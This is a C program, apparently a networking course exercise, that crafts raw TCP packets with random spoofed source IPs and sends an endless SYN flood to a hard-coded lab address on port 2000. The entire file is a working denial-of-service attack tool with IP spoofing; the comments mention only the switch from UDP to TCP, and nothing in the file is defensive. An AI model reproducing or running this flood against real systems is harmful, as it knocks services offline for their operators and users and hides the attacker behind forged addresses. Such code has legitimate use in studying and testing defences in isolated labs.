#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#define TIMEOUT 1000
/*
This code is a modification of the tutorial 4a code
I have just changed the protocol from UDP to TCP
The checksum function is the same in the header.c file 
*/
#define TARGET_IP "192.168.56.101"
#define TARGET_PORT 2000
uint32_t generate_random_ip() {
    uint32_t ip = 0;
    ip = (rand() % 256);         // First octet (0-255)
    ip = (ip << 8) | (rand() % 256);  // Second octet
    ip = (ip << 8) | (rand() % 256);  // Third octet
    ip = (ip << 8) | (rand() % 256);  // Fourth octet

    return ip;
}
struct pseudo_tcp_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t reserved;
    u_int8_t protocol;
    u_int16_t len;
};
unsigned short checksum(unsigned short *ptr,int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        oddbyte=*(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;

    return(answer);
}
int main(int argc, char *argv[])
{
    int timeout = TIMEOUT;
    if(argc > 1){
        timeout = atoi(argv[1]);
    }
	struct sockaddr_in server_addr ;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family=AF_INET;
    server_addr.sin_port=htons(TARGET_PORT);
    if (inet_pton(AF_INET,TARGET_IP,&server_addr.sin_addr)<=0){
        perror("Invalid IP address: ");
        return 1;
    }

    // create socket
    int sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    if(sock_fd < 0)
	 {
		 perror("Error creating raw socket ");
		 return 1;
	}
	else{
		printf("socket created\n");
	}




    int hincl = 1;    
              /* 1 = on, 0 = off */
   setsockopt(sock_fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));
    if(sock_fd < 0)
	 {
		 perror("Error creating raw socket ");
		 return 1;
	}

	srand(time(NULL));
	while(1){
		char packet[65536], *data;
		memset(packet, 0, 65536);

		 // Create source address with random IP
        struct sockaddr_in source_addr;
        memset(&source_addr, 0, sizeof(source_addr));
        source_addr.sin_family=AF_INET;
        source_addr.sin_port=htons(rand() % 65535);
        source_addr.sin_addr.s_addr = htonl(generate_random_ip());

		//IP header pointer
		struct iphdr *ip_header = (struct iphdr *)packet;

		//TCP header pointer
        struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
        struct pseudo_tcp_header pth;

		//fill the IP header here
		ip_header->ihl = 5; // header size
		ip_header->version = 4; // IP version set to IPv4
		ip_header->tos = 0; 
		ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) ); // total packet length
		ip_header->frag_off = 0;
		ip_header->ttl = 64;
		ip_header->protocol = IPPROTO_TCP;   // TCP protocol
		ip_header->check = 0;   // checksum variable , will be filled later
		ip_header->saddr = source_addr.sin_addr.s_addr;  // source IP adress
		ip_header->daddr = server_addr.sin_addr.s_addr; // destination IP adress 

		ip_header->check = checksum((unsigned short *)packet, ip_header->ihl*4);

		//fill the TCP header
        tcph->source= source_addr.sin_port;
        tcph->dest=server_addr.sin_port;
        tcph->seq=htonl(rand());
        tcph->ack_seq=0;
        tcph->window=htons(5840);
        tcph->check=0;
        tcph->urg_ptr=0;
        tcph->doff=5;
        tcph->fin=0;
        tcph->syn=1;
        tcph->rst=0;
        tcph->psh = 0;
        tcph->ack = 0;
        tcph->urg = 0; 
		
		//Pseudo-TCP header

		pth.source_address = source_addr.sin_addr.s_addr;
		pth.dest_address = server_addr.sin_addr.s_addr;
      	pth.reserved=0;
        pth.protocol=IPPROTO_TCP;
        pth.len=htons(sizeof(struct tcphdr));

		int psize = sizeof(pth) + sizeof(struct tcphdr);
		char *pseudogram = malloc(psize);
        memcpy(pseudogram, &pth, sizeof(pth));
        memcpy(pseudogram + sizeof(pth), tcph, sizeof(struct tcphdr));

		tcph->check = checksum((unsigned short *)pseudogram, psize);

		free(pseudogram);

		//send the packet
		struct sockaddr_in sin;
		sin.sin_family = AF_INET;
		sin.sin_port = htons(TARGET_PORT);
		sin.sin_addr.s_addr = inet_addr(TARGET_IP);
		if (sendto(sock_fd, packet, ntohs(ip_header->tot_len), 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
			perror("sendto() failed");
		} else {
			printf("Packet sent successfully.\n");
		}
        usleep(timeout);
	}
    pclose(sock_fd);
    return 0;


}
